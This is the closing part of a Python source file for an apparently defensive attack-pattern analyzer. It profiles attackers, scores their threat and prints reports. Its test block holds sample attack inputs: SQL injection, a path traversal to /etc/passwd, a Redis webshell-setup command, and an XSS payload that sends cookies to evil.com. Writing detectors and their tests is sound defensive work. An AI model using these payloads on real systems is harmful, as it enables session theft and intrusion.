                    profile.attack_types.append(p.attack_type)
                if p.attack_stage not in profile.attack_stages_reached:
                    profile.attack_stages_reached.append(p.attack_stage)
                
                ttp = f"{p.mitre_id}: {p.mitre_technique}"
                if ttp not in profile.ttps:
                    profile.ttps.append(ttp)
            
            if service not in profile.services_targeted:
                profile.services_targeted.append(service)
            
            # Update sophistication level
            profile.sophistication_level = self._calculate_sophistication(profile)
            profile.threat_level = self._calculate_threat_level(profile)
    
    def _calculate_sophistication(self, profile: AttackerProfile) -> str:
        """Calculate attacker sophistication level"""
        score = 0
        
        # More stages = more sophisticated
        score += len(set(profile.attack_stages_reached)) * 10
        
        # More attack types = more sophisticated
        score += len(set(profile.attack_types)) * 5
        
        # More services = more sophisticated
        score += len(set(profile.services_targeted)) * 3
        
        if score >= 50:
            return "advanced"
        elif score >= 30:
            return "intermediate"
        elif score >= 15:
            return "basic"
        else:
            return "script_kiddie"
    
    def _calculate_threat_level(self, profile: AttackerProfile) -> str:
        """Calculate overall threat level"""
        max_stage = max(profile.attack_stages_reached) if profile.attack_stages_reached else 1
        
        if max_stage >= 6:  # C2 or beyond
            return "critical"
        elif max_stage >= 4:  # Exploitation
            return "high"
        elif max_stage >= 2:
            return "medium"
        else:
            return "low"
    
    # =========================================================================
    # REPORTING
    # =========================================================================
    
    def get_session(self, source_ip: str, service: str) -> Optional[AttackSession]:
        """Get attack session for IP and service"""
        session_key = f"{source_ip}:{service}"
        return self.attack_sessions.get(session_key)
    
    def get_attacker_profile(self, source_ip: str) -> Optional[AttackerProfile]:
        """Get attacker profile for IP"""
        return self.attacker_profiles.get(source_ip)
    
    def get_all_sessions(self) -> List[AttackSession]:
        """Get all attack sessions"""
        return list(self.attack_sessions.values())
    
    def get_all_profiles(self) -> List[AttackerProfile]:
        """Get all attacker profiles"""
        return list(self.attacker_profiles.values())
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get analyzer statistics"""
        attack_type_dist = defaultdict(int)
        severity_dist = defaultdict(int)
        stage_dist = defaultdict(int)
        
        for session in self.attack_sessions.values():
            for pattern in session.patterns_detected:
                attack_type_dist[pattern.attack_type] += 1
                severity_dist[pattern.severity] += 1
                stage_dist[pattern.attack_stage] += 1
        
        return {
            "total_analyses": self.statistics["analysis_count"],
            "patterns_detected": self.statistics["patterns_detected"],
            "active_sessions": len(self.attack_sessions),
            "attacker_profiles": len(self.attacker_profiles),
            "attack_type_distribution": dict(attack_type_dist),
            "severity_distribution": dict(severity_dist),
            "kill_chain_distribution": dict(stage_dist),
            "generated_at": datetime.now().isoformat()
        }
    
    def generate_report(self) -> str:
        """Generate comprehensive attack analysis report"""
        stats = self.get_statistics()
        
        report = f"""
╔══════════════════════════════════════════════════════════════════════════╗
║            CYBER MIRAGE - ATTACK PATTERN ANALYSIS REPORT                 ║
║                     Production Security Analysis                          ║
╠══════════════════════════════════════════════════════════════════════════╣
║  Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC'):<55} ║
╠══════════════════════════════════════════════════════════════════════════╣

📊 ANALYSIS SUMMARY
════════════════════════════════════════════════════════════════════════════
  Total Analyses: {stats['total_analyses']}
  Patterns Detected: {stats['patterns_detected']}
  Active Sessions: {stats['active_sessions']}
  Attacker Profiles: {stats['attacker_profiles']}

🎯 ATTACK TYPE DISTRIBUTION
════════════════════════════════════════════════════════════════════════════
"""
        
        for attack_type, count in sorted(stats['attack_type_distribution'].items(), 
                                        key=lambda x: x[1], reverse=True):
            bar = "█" * min(count, 20)
            report += f"  {attack_type:25} {bar} ({count})\n"
        
        report += """
⚠️ SEVERITY DISTRIBUTION
════════════════════════════════════════════════════════════════════════════
"""
        severity_icons = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢", "informational": "🔵"}
        for severity, count in stats['severity_distribution'].items():
            icon = severity_icons.get(severity, "⚪")
            bar = "█" * min(count, 20)
            report += f"  {icon} {severity.upper():15} {bar} ({count})\n"
        
        report += """
🔗 CYBER KILL CHAIN STAGES
════════════════════════════════════════════════════════════════════════════
"""
        stage_names = {
            1: "Reconnaissance", 2: "Weaponization", 3: "Delivery",
            4: "Exploitation", 5: "Installation", 6: "Command & Control",
            7: "Actions on Objectives"
        }
        for stage, count in sorted(stats['kill_chain_distribution'].items()):
            name = stage_names.get(stage, f"Stage {stage}")
            bar = "█" * min(count, 15)
            report += f"  {stage}. {name:25} {bar} ({count})\n"
        
        # Top Threat Actors
        report += """
🎭 TOP THREAT ACTORS
════════════════════════════════════════════════════════════════════════════
"""
        profiles = sorted(self.attacker_profiles.values(), 
                         key=lambda x: x.total_attacks, reverse=True)[:5]
        
        for i, profile in enumerate(profiles, 1):
            threat_icons = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢"}
            icon = threat_icons.get(profile.threat_level, "⚪")
            report += f"""
  {i}. {profile.ip_addresses[0]}
     {icon} Threat Level: {profile.threat_level.upper()}
     Sophistication: {profile.sophistication_level}
     Total Attacks: {profile.total_attacks}
     Services Targeted: {', '.join(profile.services_targeted[:3])}
     Attack Types: {', '.join(profile.attack_types[:3])}
"""
        
        report += """
════════════════════════════════════════════════════════════════════════════
                      END OF ATTACK PATTERN REPORT
╚══════════════════════════════════════════════════════════════════════════╝
"""
        return report


# =============================================================================
# MODULE INITIALIZATION
# =============================================================================

_analyzer_instance = None

def get_analyzer(redis_client=None, db_connection=None) -> AttackPatternAnalyzer:
    """Get or create AttackPatternAnalyzer singleton"""
    global _analyzer_instance
    
    if _analyzer_instance is None:
        _analyzer_instance = AttackPatternAnalyzer(redis_client, db_connection)
    
    return _analyzer_instance


# =============================================================================
# MAIN EXECUTION
# =============================================================================

if __name__ == "__main__":
    # Test the module
    analyzer = AttackPatternAnalyzer()
    
    # Test attack patterns
    test_cases = [
        {
            "content": "Failed password for invalid user admin from 185.220.101.50 port 54322 ssh2",
            "source_ip": "185.220.101.50",
            "service": "ssh"
        },
        {
            "content": "GET /admin' OR '1'='1 HTTP/1.1",
            "source_ip": "45.155.205.100",
            "service": "http"
        },
        {
            "content": "GET /../../etc/passwd HTTP/1.1",
            "source_ip": "141.98.10.50",
            "service": "http"
        },
        {
            "content": "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
            "source_ip": "194.26.29.100",
            "service": "http"
        },
        {
            "content": "CONFIG SET dir /var/www/html",
            "source_ip": "91.219.236.50",
            "service": "redis"
        }
    ]
    
    print("\n🎯 Attack Pattern Analysis Results:\n")
    
    for test in test_cases:
        patterns = analyzer.analyze(
            content=test["content"],
            source_ip=test["source_ip"],
            service=test["service"]
        )
        
        print(f"Content: {test['content'][:50]}...")
        print(f"IP: {test['source_ip']} | Service: {test['service']}")
        
        if patterns:
            for p in patterns:
                severity_icons = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢"}
                icon = severity_icons.get(p.severity, "⚪")
                print(f"  {icon} {p.attack_type.upper()}")
                print(f"     MITRE: {p.mitre_id} - {p.mitre_technique}")
                print(f"     Stage: {p.attack_stage} | Confidence: {p.confidence}%")
        else:
            print("  No patterns detected")
        print()
    
    # Generate report
    print(analyzer.generate_report())
